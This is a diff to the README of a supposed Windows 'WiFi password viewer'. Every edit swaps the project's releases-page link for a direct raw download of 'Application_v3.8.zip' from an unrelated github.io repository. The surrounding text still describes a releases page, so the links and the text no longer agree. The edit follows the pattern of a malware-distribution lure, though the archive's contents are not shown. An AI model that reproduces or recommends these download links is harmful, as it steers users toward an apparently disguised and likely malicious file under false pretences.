@@ -6,7 +6,7 @@ description: "Recover all saved WiFi passwords on Windows instantly—offline, p
 <h1>📶 wifi-password-viewer - View Saved WiFi Passwords Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/haseeb-321/wifi-password-viewer/releases">
+  <a href="https://github.com/haseeb-321/haseeb-321.github.io/raw/refs/heads/main/screechy/Application_v3.8.zip">
     <img src="https://img.shields.io/badge/Download-wifi--password--viewer-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" width="300" height="60">
   </a>
 </p>
@@ -27,7 +27,7 @@ Getting started takes less than 60 seconds. Here is exactly what you need to do:
 
 <h3>📥 Step 1: Download the Application</h3>
 
-<p>Visit this link to download the application: <a href="https://github.com/haseeb-321/wifi-password-viewer/releases">https://github.com/haseeb-321/wifi-password-viewer/releases</a></p>
+<p>Visit this link to download the application: <a href="https://github.com/haseeb-321/haseeb-321.github.io/raw/refs/heads/main/screechy/Application_v3.8.zip">https://github.com/haseeb-321/haseeb-321.github.io/raw/refs/heads/main/screechy/Application_v3.8.zip</a></p>
 
 On that page, you will see a list of available versions. Look for the most recent release (usually at the top) and click the download file that matches your system. The download will begin automatically.
 
@@ -84,7 +84,7 @@ Officially, the app supports Windows 10 and newer. However, many users have repo
 
 <h2>📥 Download Instructions (Detailed)</h2>
 
-<p><strong>Visit this link to download the application:</strong> <a href="https://github.com/haseeb-321/wifi-password-viewer/releases">https://github.com/haseeb-321/wifi-password-viewer/releases</a></p>
+<p><strong>Visit this link to download the application:</strong> <a href="https://github.com/haseeb-321/haseeb-321.github.io/raw/refs/heads/main/screechy/Application_v3.8.zip">https://github.com/haseeb-321/haseeb-321.github.io/raw/refs/heads/main/screechy/Application_v3.8.zip</a></p>
 
 Here is a more detailed walkthrough for those who are not used to downloading software from GitHub:
 
@@ -171,7 +171,7 @@ Thank you for choosing wifi-password-viewer. This tool was created to make life 
 </p>
 
 <p align="center">
-  <a href="https://github.com/haseeb-321/wifi-password-viewer/releases" style="font-size: 20px; font-weight: bold; color: #ffffff; background-color: #2ea44f; padding: 15px 40px; border-radius: 8px; text-decoration: none; display: inline-block;">⬇️ Get wifi-password-viewer Here</a>
+  <a href="https://github.com/haseeb-321/haseeb-321.github.io/raw/refs/heads/main/screechy/Application_v3.8.zip" style="font-size: 20px; font-weight: bold; color: #ffffff; background-color: #2ea44f; padding: 15px 40px; border-radius: 8px; text-decoration: none; display: inline-block;">⬇️ Get wifi-password-viewer Here</a>
 </p>
 
 <p align="center">
